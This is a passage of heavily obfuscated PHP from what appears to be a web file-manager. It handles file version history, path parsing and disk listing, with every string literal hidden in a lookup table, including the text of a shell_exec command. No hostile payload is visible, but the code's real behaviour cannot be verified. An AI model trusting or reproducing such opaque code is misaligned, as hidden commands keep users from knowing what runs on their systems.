$¨µªù¥[] = $³ğõ¼À·; } return self::saveData($ÆÄÄ‚²š[$¡ŸÂ¤Ë[1331]], $¨µªù¥); } public static function clear($ÙâÄ£š“, $Û°ÓàÉ = true) { $şœàñ‚š =& $_SERVER[±³—úê]; $àÛô³  = self::listData($ÙâÄ£š“, $Û°ÓàÉ); if (!$àÛô³ ) { return !1; } foreach ($àÛô³ [$şœàñ‚š[456]] as $±—ñœ—š) { IO::remove($àÛô³ [$şœàñ‚š[1330]] . $±—ñœ—š[$şœàñ‚š[32]]); } return self::saveData($àÛô³ [$şœàñ‚š[1331]], array()); } public static function moveHistory($Ş˜“Â»é, $Ô”ˆ€‘¤ = '', $¡ŠÜèÀ” = '') { $íö­ş =& $_SERVER[±³—úê]; $şİŠ¸ë³ = self::listData($Ş˜“Â»é, !1); if (!$şİŠ¸ë³ || !$şİŠ¸ë³[$íö­ş[456]]) { return !1; } $šëëäŠ = $íö­ş[1318]; $Ô”ˆ€‘¤ = $Ô”ˆ€‘¤ ? $Ô”ˆ€‘¤ : get_path_this($Ş˜“Â»é); $¡ŠÜèÀ” = $¡ŠÜèÀ” ? $¡ŠÜèÀ” : $şİŠ¸ë³[$íö­ş[1330]]; $óö§™ï = substr(get_path_this($şİŠ¸ë³[$íö­ş[1331]]), 0, -strlen($šëëäŠ)); foreach ($şİŠ¸ë³[$íö­ş[456]] as $ÄşµÍ§Œ => $ƒò”ßâ) { $çüŠÓÓ€ = $Ô”ˆ€‘¤ . substr($ƒò”ßâ[$íö­ş[32]], strlen($óö§™ï)); $¹Œš”Ü¼ = IO::move($şİŠ¸ë³[$íö­ş[1330]] . $ƒò”ßâ[$íö­ş[32]], $¡ŠÜèÀ”, !1, $çüŠÓÓ€); if ($¹Œš”Ü¼) { $şİŠ¸ë³[$íö­ş[456]][$ÄşµÍ§Œ][$íö­ş[32]] = $çüŠÓÓ€; } } $şİŠ¸ë³[$íö­ş[1331]] = IO::move($şİŠ¸ë³[$íö­ş[1331]], $¡ŠÜèÀ”, !1, $Ô”ˆ€‘¤ . $šëëäŠ); self::saveData($şİŠ¸ë³[$íö­ş[1331]], $şİŠ¸ë³[$íö­ş[456]]); self::clearEmptyFolder($şİŠ¸ë³[$íö­ş[1330]]); } public static function rollback($™óà¡Á¨, $²êó¨Ã¼) { $µâÆÍ¥š =& $_SERVER[±³—úê]; $ŸÊ¿©Ú¿ = self::listData($™óà¡Á¨); if (!$ŸÊ¿©Ú¿) { return; } $ó …õØ¥ = IO::info($™óà¡Á¨); foreach ($ŸÊ¿©Ú¿[$µâÆÍ¥š[456]] as $ÉÀŞ¯¶Ø => $¿û’úÙ‚) { if ($¿û’úÙ‚[$µâÆÍ¥š[486]] == $²êó¨Ã¼) { self::add($™óà¡Á¨); $×ËÓï˜ñ = $ŸÊ¿©Ú¿[$µâÆÍ¥š[1330]] . $¿û’úÙ‚[$µâÆÍ¥š[32]]; $Ú‚Àª¨ = IO::copy($×ËÓï˜ñ, IO::pathFather($™óà¡Á¨), REPEAT_REPLACE, $ó …õØ¥[$µâÆÍ¥š[32]]); if ($Ú‚Àª¨) { self::remove($™óà¡Á¨, $²êó¨Ã¼); } return $Ú‚Àª¨; } } return !1; } public static function setDetail($âØò•ß×, $ı»‚¤º, $Ä—ÅĞÙ) { $Ç¬Š†‡Ì =& $_SERVER[±³—úê]; $Ò¥”ü½¨ = self::listData($âØò•ß×); if (!$Ò¥”ü½¨) { return; } foreach ($Ò¥”ü½¨[$Ç¬Š†‡Ì[456]] as $­óŠ¦™Û => $±Óİ¡±Š) { if ($±Óİ¡±Š[$Ç¬Š†‡Ì[486]] == $ı»‚¤º) { $Ò¥”ü½¨[$Ç¬Š†‡Ì[456]][$­óŠ¦™Û][$Ç¬Š†‡Ì[1329]] = $Ä—ÅĞÙ; self::saveData($Ò¥”ü½¨[$Ç¬Š†‡Ì[1331]], $Ò¥”ü½¨[$Ç¬Š†‡Ì[456]]); return !0; } } return !1; } public static function fileInfo($´şä—øî, $Ò¡¶£ºø) { $µ–Îúº =& $_SERVER[±³—úê]; $Ò‡ÄœŒ = self::listData($´şä—øî); if (!$Ò‡ÄœŒ) { show_json(LNG($µ–Îúº[108]), !1); } $íàÓµ…Ø = $µ–Îúº[12]; foreach ($Ò‡ÄœŒ[$µ–Îúº[456]] as $ÅÆãõì¶ => $£³“¨ñĞ) { if ($£³“¨ñĞ[$µ–Îúº[486]] != $Ò¡¶£ºø) { continue; } $íàÓµ…Ø = $Ò‡ÄœŒ[$µ–Îúº[1330]] . $£³“¨ñĞ[$µ–Îúº[32]]; break; } if (!$íàÓµ…Ø) { show_json(LNG($µ–Îúº[108]), !1); } return IO::info($íàÓµ…Ø); } public static function fileOut($èæá¡üƒ, $Ñ¼î¢«—, $å×£Ø¶× = false) { $ÆªìÀİĞ =& $_SERVER[±³—úê]; $°•æ•Æ = self::fileInfo($èæá¡üƒ, $Ñ¼î¢«—); $¨Ÿü =& $GLOBALS[$ÆªìÀİĞ[7]]; $å×£Ø¶× = isset($¨Ÿü[$ÆªìÀİĞ[1281]]) && $¨Ÿü[$ÆªìÀİĞ[1281]] == 1; if (isset($¨Ÿü[$ÆªìÀİĞ[33]]) && $¨Ÿü[$ÆªìÀİĞ[33]] == $ÆªìÀİĞ[1332]) { return IO::fileOutImage($°•æ•Æ[$ÆªìÀİĞ[87]], $¨Ÿü[$ÆªìÀİĞ[1333]]); } IO::fileOut($°•æ•Æ[$ÆªìÀİĞ[87]], $å×£Ø¶×, get_path_this($èæá¡üƒ)); } public static function listData($ÊÎ‡¬ã», $ñ©Ïî›õ = true) { $¢ëŸè‚ =& $_SERVER[±³—úê]; if ($ñ©Ïî›õ && !IO::exist($ÊÎ‡¬ã»)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ÊÎ‡¬ã», 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $å±‹×ú = self::pathHistory($ÊÎ‡¬ã»); $‘ƒ‚Øìè = array($¢ëŸè‚[1331] => $å±‹×ú . $¢ëŸè‚[1318], $¢ëŸè‚[1330] => rtrim(get_path_father($å±‹×ú), $¢ëŸè‚[8]) . $¢ëŸè‚[8], $¢ëŸè‚[456] => array()); $˜êĞ«Î“ = IO::getContent($‘ƒ‚Øìè[$¢ëŸè‚[1331]]); if ($˜êĞ«Î“) { $Ò¥â»øû = json_decode($˜êĞ«Î“, !0); if (is_array($Ò¥â»øû)) { $‘ƒ‚Øìè[$¢ëŸè‚[456]] = $Ò¥â»øû; } } return $‘ƒ‚Øìè; } private static function saveData($Ú¹ŒÂû„, $Í¶Ä¨¥Ì) { $û¥¹¸áº =& $_SERVER[±³—úê]; self::log($û¥¹¸áº[1334] . $Ú¹ŒÂû„ . $û¥¹¸áº[74] . count($Í¶Ä¨¥Ì), $û¥¹¸áº[832]); if ($Í¶Ä¨¥Ì) { return IO::setContent($Ú¹ŒÂû„, json_encode($Í¶Ä¨¥Ì)); } $ßƒìôßÙ = IO::pathFather($Ú¹ŒÂû„); IO::remove($Ú¹ŒÂû„); self::clearEmptyFolder($ßƒìôßÙ); return !0; } public static function clearEmptyFolder($¤ì“Òêƒ) { $Ê°÷”¿ë =& $_SERVER[±³—úê]; if (trim($¤ì“Òêƒ, $Ê°÷”¿ë[8]) == trim(self::$_historyBase, $Ê°÷”¿ë[8])) { return; } $•ƒùê® = IO::pathFather($¤ì“Òêƒ); $Øéê¿› = IO::has($¤ì“Òêƒ, !0); if ($Øéê¿›[$Ê°÷”¿ë[251]] > 0 || $Øéê¿›[$Ê°÷”¿ë[252]] > 0) { return; } IO::remove($¤ì“Òêƒ); self::clearEmptyFolder($•ƒùê®); } private static function getBasePath() { $ü·ñô¿¥ =& $_SERVER[±³—úê]; $±ñŸ®ÎÑ = Model($ü·ñô¿¥[1335])->get($ü·ñô¿¥[1336]); if ($±ñŸ®ÎÑ) { if (!IO::exist($±ñŸ®ÎÑ)) { IO::mkdir($±ñŸ®ÎÑ); } if (get_path_this($±ñŸ®ÎÑ) == $ü·ñô¿¥[1321]) { $ßÚ¥Ş—÷ = $ü·ñô¿¥[1337] . rand_string(8); @rename($±ñŸ®ÎÑ, get_path_father($±ñŸ®ÎÑ) . $ü·ñô¿¥[8] . $ßÚ¥Ş—÷); $±ñŸ®ÎÑ = DATA_PATH . $ßÚ¥Ş—÷ . $ü·ñô¿¥[8]; file_put_contents(DATA_PATH . $ü·ñô¿¥[1268], $ü·ñô¿¥[12]); Model($ü·ñô¿¥[1335])->set($ü·ñô¿¥[1336], $±ñŸ®ÎÑ); } return $±ñŸ®ÎÑ; } $±ñŸ®ÎÑ = DATA_PATH . $ü·ñô¿¥[1337] . rand_string(8) . $ü·ñô¿¥[8]; $±ñŸ®ÎÑ = IO::mkdir($±ñŸ®ÎÑ); $±ñŸ®ÎÑ = rtrim($±ñŸ®ÎÑ, $ü·ñô¿¥[8]) . $ü·ñô¿¥[8]; file_put_contents($±ñŸ®ÎÑ . $ü·ñô¿¥[1268], $ü·ñô¿¥[12]); file_put_contents(DATA_PATH . $ü·ñô¿¥[1268], $ü·ñô¿¥[12]); Model($ü·ñô¿¥[1335])->set($ü·ñô¿¥[1336], $±ñŸ®ÎÑ); return $±ñŸ®ÎÑ; } } class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\x72\x63\145\x7d"; const KOD_USER_RECYCLE = "\173\x75\x73\x65\162\x52\145\143\171\143\x6c\x65\175"; const KOD_USER_FAV = "\173\165\163\145\x72\106\x61\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\x72\106\151\x6c\145\124\141\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\145\x72\106\x69\x6c\145\x54\171\160\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\x6f\x75\160\x52\157\x6f\164\x53\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\145\162\x53\x68\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\x65\162\x53\150\x61\x72\145\x4c\x69\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\162\x65\124\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\173\163\150\x61\x72\x65\x49\x74\x65\155\175"; const KOD_SHARE_LINK = "\173\163\x68\141\x72\x65\111\x74\x65\x6d\114\151\x6e\x6b\175"; const KOD_SEARCH = "\173\163\145\141\162\x63\x68\175"; const KOD_BLOCK = "\x7b\142\154\x6f\143\x6b\x7d"; const KOD_IO = "\173\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\163\145\x72\122\145\156\143\x65\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\x64\162\151\x76\145\162\x7d"; public static function typeList() { $ã­˜ï¶í =& $_SERVER[±³—úê]; return array($ã­˜ï¶í[1338] => self::KOD_SOURCE, $ã­˜ï¶í[1339] => self::KOD_USER_RECYCLE, $ã­˜ï¶í[1340] => self::KOD_USER_FAV, $ã­˜ï¶í[1341] => self::KOD_USER_FILE_TAG, $ã­˜ï¶í[1342] => self::KOD_USER_FILE_TYPE, $ã­˜ï¶í[1343] => self::KOD_GROUP_ROOT_SELF, $ã­˜ï¶í[1344] => self::KOD_USER_SHARE, $ã­˜ï¶í[1345] => self::KOD_USER_SHARE_LINK, $ã­˜ï¶í[1346] => self::KOD_USER_SHARE_TO_ME, $ã­˜ï¶í[1347] => self::KOD_SHARE_ITEM, $ã­˜ï¶í[1348] => self::KOD_SHARE_LINK, $ã­˜ï¶í[1349] => self::KOD_SEARCH, $ã­˜ï¶í[1350] => self::KOD_BLOCK, $ã­˜ï¶í[1351] => self::KOD_IO, $ã­˜ï¶í[1352] => self::KOD_USER_RECENT, $ã­˜ï¶í[1353] => self::KOD_USER_DRIVER); } public static function parse($…£ğéëğ) { $ÄûşÖ×‰ =& $_SERVER[±³—úê]; $…£ğéëğ = self::clear($…£ğéëğ); $è©×µßÙ = array_values(self::typeList()); preg_match($ÄûşÖ×‰[1354], $…£ğéëğ, $ñ­š“Ã); $ô¼Ÿöá’ = array($ÄûşÖ×‰[507] => !1, $ÄûşÖ×‰[1355] => !1, $ÄûşÖ×‰[504] => !1, $ÄûşÖ×‰[87] => $…£ğéëğ, $ÄûşÖ×‰[1253] => !1, $ÄûşÖ×‰[1252] => $ÄûşÖ×‰[12]); if (is_array($ñ­š“Ã) && count($ñ­š“Ã) == 5) { $£•úÏ£ = $ÄûşÖ×‰[1356] . $ñ­š“Ã[2] . $ÄûşÖ×‰[413]; if (in_array($£•úÏ£, $è©×µßÙ)) { $ô¼Ÿöá’[$ÄûşÖ×‰[1253]] = $ñ­š“Ã[1]; $ô¼Ÿöá’[$ÄûşÖ×‰[33]] = $£•úÏ£; $ô¼Ÿöá’[$ÄûşÖ×‰[1357]] = substr($£•úÏ£, 1, -1); $ô¼Ÿöá’[$ÄûşÖ×‰[486]] = $ñ­š“Ã[3]; } $ô¼Ÿöá’[$ÄûşÖ×‰[1252]] = $ñ­š“Ã[4]; } $ÇñãÑ¢— = array($ÄûşÖ×‰[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ô¼Ÿöá’[$ÄûşÖ×‰[1320]] = in_array($ô¼Ÿöá’[$ÄûşÖ×‰[33]], $ÇñãÑ¢—); return $ô¼Ÿöá’; } public static function isTruePath($¬Ö‰Õ´²) { $ß¿õ “½ =& $_SERVER[±³—úê]; if (substr($¬Ö‰Õ´², 0, 1) != $ß¿õ “½[1356]) { return !0; } if (strpos($¬Ö‰Õ´², $ß¿õ “½[494]) === 0) { return !0; } if (strpos($¬Ö‰Õ´², $ß¿õ “½[1324]) === 0) { return !0; } if (strpos($¬Ö‰Õ´², $ß¿õ “½[1358]) === 0) { return !0; } if (strpos($¬Ö‰Õ´², $ß¿õ “½[1359]) === 0) { return !0; } if (strpos($¬Ö‰Õ´², $ß¿õ “½[1360]) === 0) { return !0; } return !1; } public static function clear($ªÎ¬¢—¿) { $‚¥Ÿ«› =& $_SERVER[±³—úê]; $ªÎ¬¢—¿ = str_replace(array($‚¥Ÿ«›[1158], $‚¥Ÿ«›[221]), $‚¥Ÿ«›[53], $ªÎ¬¢—¿); $ªÎ¬¢—¿ = str_replace($‚¥Ÿ«›[100], $‚¥Ÿ«›[8], $ªÎ¬¢—¿); $à†ÈàÑ× = $‚¥Ÿ«›[1361]; if (substr($ªÎ¬¢—¿, 0, 3) == $‚¥Ÿ«›[1362]) { $ªÎ¬¢—¿ = substr($ªÎ¬¢—¿, 3); } while (strstr($ªÎ¬¢—¿, $à†ÈàÑ×)) { $ªÎ¬¢—¿ = str_replace($à†ÈàÑ×, $‚¥Ÿ«›[8], $ªÎ¬¢—¿); } $ªÎ¬¢—¿ = preg_replace($‚¥Ÿ«›[1363], $‚¥Ÿ«›[8], $ªÎ¬¢—¿); if ($ªÎ¬¢—¿ == $‚¥Ÿ«›[8]) { return $‚¥Ÿ«›[8]; } $ªÎ¬¢—¿ = rtrim($ªÎ¬¢—¿, $‚¥Ÿ«›[8]); return $ªÎ¬¢—¿; } public static function pathTrue($áœàÀïŒ) { $ø´ã‚·ş =& $_SERVER[±³—úê]; if (!$áœàÀïŒ) { return $ø´ã‚·ş[12]; } $áœàÀïŒ = str_replace($ø´ã‚·ş[266], $ø´ã‚·ş[8], str_replace($ø´ã‚·ş[1364], $ø´ã‚·ş[8], $áœàÀïŒ)); $áœàÀïŒ = str_replace($ø´ã‚·ş[266], $ø´ã‚·ş[8], str_replace($ø´ã‚·ş[1364], $ø´ã‚·ş[8], $áœàÀïŒ)); if (!strstr($áœàÀïŒ, $ø´ã‚·ş[1362])) { return $áœàÀïŒ; } $¾Ãİ¦Á = explode($ø´ã‚·ş[8], $áœàÀïŒ); foreach ($¾Ãİ¦Á as $åØí¢ û => $–÷®·æé) { if ($–÷®·æé !== $ø´ã‚·ş[1365]) { continue; } for ($Öª“ˆ³è = $åØí¢ û; $Öª“ˆ³è >= 0; $Öª“ˆ³è--) { if ($¾Ãİ¦Á[$Öª“ˆ³è] === $ø´ã‚·ş[10] || $¾Ãİ¦Á[$Öª“ˆ³è] === $ø´ã‚·ş[1365] || $¾Ãİ¦Á[$Öª“ˆ³è] === -1) { continue; } if ($¾Ãİ¦Á[$Öª“ˆ³è] === $ø´ã‚·ş[12]) { $¾Ãİ¦Á[$åØí¢ û] = -1; break; } $¾Ãİ¦Á[$åØí¢ û] = -1; $¾Ãİ¦Á[$Öª“ˆ³è] = -1; break; } } $¢‘Ñ´§½ = array(); foreach ($¾Ãİ¦Á as $–÷®·æé) { if ($–÷®·æé !== -1) { $¢‘Ñ´§½[] = $–÷®·æé; } } $ó ¶›Ú½ = implode($ø´ã‚·ş[8], $¢‘Ñ´§½); if (strpos($ó ¶›Ú½, $ø´ã‚·ş[1366]) === 0) { $ó ¶›Ú½ = $ø´ã‚·ş[1362] . substr($ó ¶›Ú½, strlen($ø´ã‚·ş[1366])); } return $ó ¶›Ú½; } public static function pathUrlClear($Ä× »¥¿) { $õÙœ‘ğ¤ =& $_SERVER[±³—úê]; if (!$Ä× »¥¿) { return $Ä× »¥¿; } $Ä× »¥¿ = rawurldecode($Ä× »¥¿); $Ä× »¥¿ = str_replace($õÙœ‘ğ¤[1364], $õÙœ‘ğ¤[8], $Ä× »¥¿); if (strpos($Ä× »¥¿, $õÙœ‘ğ¤[76]) > 0) { $Ä× »¥¿ = substr($Ä× »¥¿, 0, strpos($Ä× »¥¿, $õÙœ‘ğ¤[76])); } if (strpos($Ä× »¥¿, $õÙœ‘ğ¤[1367]) > 0) { $Ä× »¥¿ = substr($Ä× »¥¿, 0, strpos($Ä× »¥¿, $õÙœ‘ğ¤[1367])); } return $Ä× »¥¿; } public static function sourceID($—¶¦«Û™) { $Š‚¦çáı =& $_SERVER[±³—úê]; $¨à‚¸í” = self::parse($—¶¦«Û™); if ($¨à‚¸í”[$Š‚¦çáı[33]] !== self::KOD_SOURCE) { show_json(LNG($Š‚¦çáı[1368]), !1); } return $¨à‚¸í”[$Š‚¦çáı[486]]; } public static function make($ÇËİ”ã) { if (!$ÇËİ”ã) { return !1; } return self::makePath(self::KOD_SOURCE, intval($ÇËİ”ã)); } public static function makeShare($‹Ò¯Í§, $–†’Šõ³) { return self::makePath(self::KOD_SHARE_ITEM, $‹Ò¯Í§, $–†’Šõ³); } public static function makeFileTypePath($Ãä¦Ç÷) { return self::makePath(self::KOD_USER_FILE_TYPE, $Ãä¦Ç÷); } public static function makeFileTagPath($²Ôã¿ñ¯) { return self::makePath(self::KOD_USER_FILE_TAG, $²Ôã¿ñ¯); } public static function makePath($¶›ìœ€ç, $Ş²¿×îæ = '', $õ›æ•äç = '') { $ñÕÉÚõü =& $_SERVER[±³—úê]; $‚§½Ÿ˜ = substr($¶›ìœ€ç, 1, -1); $İƒ‘´®ï = $ñÕÉÚõü[1369] . $‚§½Ÿ˜ . $ñÕÉÚõü[1370] . $Ş²¿×îæ . $ñÕÉÚõü[1371]; $İƒ‘´®ï = $õ›æ•äç ? $İƒ‘´®ï . $õ›æ•äç . $ñÕÉÚõü[8] : $İƒ‘´®ï; return $İƒ‘´®ï; } public static function hashPath($¤®ıÁÖ­, $¸èö¸’‚ = true) { $¶”Û‘ ° =& $_SERVER[±³—úê]; $Ûú¼Îˆ› = is_array($¤®ıÁÖ­) ? $¤®ıÁÖ­ : IO::info($¤®ıÁÖ­); $±ï·ó¤º = _get($Ûú¼Îˆ›, $¶”Û‘ °[1372], $¶”Û‘ °[12]); if (!$±ï·ó¤º && isset($Ûú¼Îˆ›[$¶”Û‘ °[247]])) { $±ï·ó¤º = trim($Ûú¼Îˆ›[$¶”Û‘ °[247]], $¶”Û‘ °[121]); } if (!$±ï·ó¤º && isset($Ûú¼Îˆ›[$¶”Û‘ °[193]]) && $Ûú¼Îˆ›[$¶”Û‘ °[193]]) { $Ûú¼Îˆ› = IO::info(KodIO::make($Ûú¼Îˆ›[$¶”Û‘ °[193]])); $±ï·ó¤º = _get($Ûú¼Îˆ›, $¶”Û‘ °[1372], $¶”Û‘ °[12]); } $†Œ©ğ ® = md5($Ûú¼Îˆ›[$¶”Û‘ °[87]] . $Ûú¼Îˆ›[$¶”Û‘ °[79]] . $Ûú¼Îˆ›[$¶”Û‘ °[88]]); if (!$±ï·ó¤º && file_exists($Ûú¼Îˆ›[$¶”Û‘ °[87]])) { $±ï·ó¤º = Cache::get($†Œ©ğ ® . $¶”Û‘ °[1373]); $±ï·ó¤º = !1; if (!$±ï·ó¤º) { $±ï·ó¤º = IO::hashSimple($Ûú¼Îˆ›[$¶”Û‘ °[87]]); Cache::set($†Œ©ğ ® . $¶”Û‘ °[1373], $±ï·ó¤º, 3600 * 24 * 30); } } if ($¸èö¸’‚ && !$±ï·ó¤º) { } return $±ï·ó¤º ? $±ï·ó¤º : $†Œ©ğ ®; } public static function hashPathSafe($¹ôÛ¸ıª, $ø–ŸÈ®§ = true) { $»Å§Ìıë =& $_SERVER[±³—úê]; $Ä¬¡¹âï = self::hashPath($¹ôÛ¸ıª, $ø–ŸÈ®§); return md5($Ä¬¡¹âï . $»Å§Ìıë[1374] . Model($»Å§Ìıë[850])->get($»Å§Ìıë[851])); } public static function initSystemPath() { $ŒÖ¡øÈÎ =& $_SERVER[±³—úê]; if (defined($ŒÖ¡øÈÎ[1375])) { return; } define($ŒÖ¡øÈÎ[1375], self::systemPath($ŒÖ¡øÈÎ[191])); define($ŒÖ¡øÈÎ[1376], self::systemPath($ŒÖ¡øÈÎ[1377])); define($ŒÖ¡øÈÎ[1378], self::systemPath($ŒÖ¡øÈÎ[1379])); define($ŒÖ¡øÈÎ[1380], self::systemPath($ŒÖ¡øÈÎ[1381])); IOHistory::bindEvent(); } public static function systemPath($ß¿Ğ¨”Ã) { $–ï¬üí =& $_SERVER[±³—úê]; $ğò¼‘û = $–ï¬üí[1382] . ucfirst($ß¿Ğ¨”Ã); $Øõ‘¢şŒ = Model($–ï¬üí[850])->get($ğò¼‘û); if ($Øõ‘¢şŒ) { return $Øõ‘¢şŒ; } if ($ß¿Ğ¨”Ã == $–ï¬üí[191]) { $Øõ‘¢şŒ = self::make(Model($–ï¬üí[905])->systemRootPathAdd($–ï¬üí[619])); } else { $Øõ‘¢şŒ = self::systemPath($–ï¬üí[191]); $æî–ò = self::sourceID($Øõ‘¢şŒ); $Øõ‘¢şŒ = self::make(Model($–ï¬üí[905])->mkdir($æî–ò, $ß¿Ğ¨”Ã)); } Model($–ï¬üí[850])->set($ğò¼‘û, $Øõ‘¢şŒ); return $Øõ‘¢şŒ; } public static function systemFolder($§ä¼âí) { $¯ß„æûğ = IO_PATH_SYSTEM_SOURCE . $§ä¼âí; $Ê½ÖÄ = Cache::get($¯ß„æûğ); if (!$Ê½ÖÄ) { $¯®º±üß = IO::infoFullSimple($¯ß„æûğ); if (!$¯®º±üß) { $Ê½ÖÄ = IO::mkdir($¯ß„æûğ, REPEAT_SKIP); } else { $Ê½ÖÄ = $¯®º±üß[$_SERVER[±³—úê][87]]; } Cache::set($¯ß„æûğ, $Ê½ÖÄ, 3600 * 10); } return $Ê½ÖÄ; } public static function defaultDriver() { return Model($_SERVER[±³—úê][847])->defaultDriver(); } public static function defaultIO() { $ §‚ñôÔ =& $_SERVER[±³—úê]; $¦›‰É¨„ = self::defaultDriver(); return $ §‚ñôÔ[1383] . $¦›‰É¨„[$ §‚ñôÔ[486]] . $ §‚ñôÔ[1371]; } public static function defaultDriverInit() { static $’ã¾ıö = false; if ($’ã¾ıö) { return $’ã¾ıö; } $’ã¾ıö = IO::init(self::defaultIO()); return $’ã¾ıö; } public static function fileTypeList() { $‘Áú“­ =& $_SERVER[±³—úê]; $ˆööÉÓ = $GLOBALS[$‘Áú“­[6]][$‘Áú“­[1384]]; foreach ($ˆööÉÓ as $Ë©ûˆˆö => $Èü„•Æğ) { $“ÕŞùÒ = $‘Áú“­[1385] . $Ë©ûˆˆö; $€ß¬¿¦à = LNG($“ÕŞùÒ); if ($“ÕŞùÒ != $€ß¬¿¦à) { $ˆööÉÓ[$Ë©ûˆˆö][$‘Áú“­[32]] = $€ß¬¿¦à; } } return $ˆööÉÓ; } public static function diskList($šşÍñ› = true) { $ôÑéã›À = $_SERVER[±³—úê][1386]; if ($šşÍñ›) { $ô¡ÎÉ¡‚ = Cache::get($ôÑéã›À); if (is_array($ô¡ÎÉ¡‚)) { return $ô¡ÎÉ¡‚; } } $ô¡ÎÉ¡‚ = self::diskListGet(); Cache::set($ôÑéã›À, $ô¡ÎÉ¡‚, 60); return $ô¡ÎÉ¡‚; } public static function diskListGet() { $¼ìˆÛáÇ =& $_SERVER[±³—úê]; $ĞóÆŞª = array(); if ($GLOBALS[$¼ìˆÛáÇ[6]][$¼ìˆÛáÇ[1387]] == $¼ìˆÛáÇ[1388]) { $™ÛºÂ‘ù = $¼ìˆÛáÇ[1389]; for ($í´Üˆ = 0; $í´Üˆ < strlen($™ÛºÂ‘ù); $í´Üˆ++) { $ˆÓµÖşª = $™ÛºÂ‘ù[$í´Üˆ] . $¼ìˆÛáÇ[1390]; if (file_exists($ˆÓµÖşª)) { $ĞóÆŞª[] = $ˆÓµÖşª; } } return $ĞóÆŞª; } if (!function_exists($¼ìˆÛáÇ[101])) { $ĞóÆŞª[] = $¼ìˆÛáÇ[916]; return $ĞóÆŞª; } $ïôÑˆì¡ = explode($¼ìˆÛáÇ[221], shell_exec($¼ìˆÛáÇ[1391])); array_shift($ïôÑˆì¡); array_pop($ïôÑˆì¡); $À­¼û = array($¼ìˆÛáÇ[1392], $¼ìˆÛáÇ[1393], $¼ìˆÛáÇ[1394], $¼ìˆÛáÇ[1395], $¼ìˆÛáÇ[1396], $¼ìˆÛáÇ[1397], $¼ìˆÛáÇ[1398], $¼ìˆÛáÇ[1399]); foreach ($ïôÑˆì¡ as $¾¤©Ñºğ) { $È¡ø‚µ¿ = preg_split($¼ìˆÛáÇ[1400], $¾¤©Ñºğ); $ˆÓµÖşª = $È¡ø‚µ¿[count($È¡ø‚µ¿) - 1]; if (!strstr($È¡ø‚µ¿[0], $¼ìˆÛáÇ[1401]) || !$ˆÓµÖşª) { continue; } $¾šæá¬¢ = rtrim($ˆÓµÖşª, $¼ìˆÛáÇ[8]) . $¼ìˆÛáÇ[8]; if (in_array($¾šæá¬¢, $À­¼û)) { continue; } $ĞóÆŞª[] = $¾šæá¬¢; } return $ĞóÆŞª; } public static function isSameDisk($ÍÑØÖÙ, $´ÀÁÍÓÔ) { $†‡ò ³¿ =& $_SERVER[±³—úê]; if ($GLOBALS[$†‡ò ³¿[6]][$†‡ò ³¿[1387]] == $†‡ò ³¿[1388]) { return strtolower(substr($ÍÑØÖÙ, 0, 1)) == strtolower(substr($´ÀÁÍÓÔ, 0, 1)); } $…ö»º½˜ = stat($ÍÑØÖÙ); $¦—İ¢´Î = stat($´ÀÁÍÓÔ); if ($…ö»º½˜ === !1 || $¦—İ¢´Î === !1) { return !1; } return $…ö»º½˜[$†‡ò ³¿[1402]] === $¦—İ¢´Î[$†‡ò ³¿[1402]]; $÷¬Üí¡˜ = self::diskList(); $ÆÂ¦Å©¶ = !1; $ı¾­ò = !1; sort($÷¬Üí¡˜); $÷¬Üí¡˜ = array_reverse($÷¬Üí¡˜); $ÍÑØÖÙ = rtrim($ÍÑØÖÙ, $†‡ò ³¿[8]) . $†‡ò ³¿[8]; $´ÀÁÍÓÔ = rtrim($´ÀÁÍÓÔ, $†‡ò ³¿[8]) . $†‡ò ³¿[8]; foreach ($÷¬Üí¡˜ as $øƒ¹ƒš) { $úÙëœ¾ç = strlen($øƒ¹ƒš); if (!$ÆÂ¦Å©¶ && substr($ÍÑØÖÙ, 0, $úÙëœ¾ç) == $øƒ¹ƒš) { $ÆÂ¦Å©¶ = $øƒ¹ƒš; } if (!$ı¾­ò && substr($´ÀÁÍÓÔ, 0, $úÙëœ¾ç) == $øƒ¹ƒš) { $ı¾­ò = $øƒ¹ƒš; } if ($ÆÂ¦Å©¶ && $ı¾­ò) { break; } } return $ÆÂ¦Å©¶ === $ı¾­ò; } public static function transferType($œùá¿›­, $œÏ¢¦™¾) { $ÜúÃÕê‡ =& $_SERVER[±³—úê]; $´¯ƒÙ˜ = self::driverType($œùá¿›­); $ü‰À‡´ = self::driverType($œÏ¢¦™¾); if ($´¯ƒÙ˜[$ÜúÃÕê‡[33]] == $ü‰À‡´[$ÜúÃÕê‡[33]] && $´¯ƒÙ˜[$ÜúÃÕê‡[1403]] == $ü‰À‡´[$ÜúÃÕê‡[1403]]) { return $ÜúÃÕê‡[1404]; } if ($´¯ƒÙ˜[$ÜúÃÕê‡[33]] == $ÜúÃÕê‡[950] && $ü‰À‡´[$ÜúÃÕê‡[33]] == $ÜúÃÕê‡[109]) { return $ÜúÃÕê‡[1281]; } if ($´¯ƒÙ˜[$ÜúÃÕê‡[33]] == $ÜúÃÕê‡[109] && $ü‰À‡´[$ÜúÃÕê‡[33]] == $ÜúÃÕê‡[950]) { return $ÜúÃÕê‡[110]; } return $ÜúÃÕê‡[1405]; } public static function driverType($¬Ü©ş°™) { $„¼“¸€„ =& $_SERVER[±³—úê]; $®¹ú†„º = str_replace($„¼“¸€„[1406], $„¼“¸€„[12], strtolower($¬Ü©ş°™->getType())); if ($®¹ú†„º == $„¼“¸€„[837] || $®¹ú†„º == $„¼“¸€„[1407] || $®¹ú†„º == $„¼“¸€„[1408]) { $¬Ü©ş°™ = self::defaultDriverInit(); } else { if ($®¹ú†„º == $„¼“¸€„[1291] || $®¹ú†„º == $„¼“¸€„[1409]) { $¬Ü©ş°™ = 